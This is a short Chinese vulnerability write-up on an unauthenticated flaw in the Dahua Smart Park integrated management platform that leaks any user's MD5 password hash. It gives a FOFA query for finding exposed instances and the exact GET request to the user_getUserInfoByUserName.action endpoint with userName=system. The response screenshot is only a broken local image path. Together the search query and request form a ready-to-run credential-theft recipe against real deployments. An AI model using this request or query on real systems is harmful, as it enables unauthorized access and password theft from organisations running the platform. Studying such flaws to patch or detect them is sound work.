# 大华智慧园区任意密码读取攻击

1.漏洞描述

大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。由于该平台未对接口权限做限制，攻击者可以从`user_getUserInfoByUserName.action`接口获取任意用户密码(MD5格式)

2.搜索语法

```plain
fofa：app="dahua-智慧园区综合管理平台"
```

3.漏洞复现

```plain
GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
```

响应包显示如下

![image-20240613202058959](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240613202058959.png)